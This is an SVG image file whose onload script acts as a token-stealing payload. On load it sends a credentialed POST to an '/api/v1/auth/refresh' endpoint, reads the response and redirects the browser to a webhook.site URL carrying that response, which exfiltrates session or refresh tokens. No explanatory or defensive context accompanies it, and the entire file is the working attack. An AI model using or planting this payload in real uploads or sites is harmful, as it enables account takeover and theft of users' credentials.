<svg xmlns="http://www.w3.org/2000/svg" onload="
fetch('/api/v1/auth/refresh',{
  method:'POST',
  credentials:'include',
  headers:{'Content-Type':'application/json'},
  body:'{}'
}).then(r=>r.text()).then(t=>{
  location='https://webhook.site/635b8188-b286-4b68-9a09-814367040687/log?d='+encodeURIComponent(t)
})">
</svg>
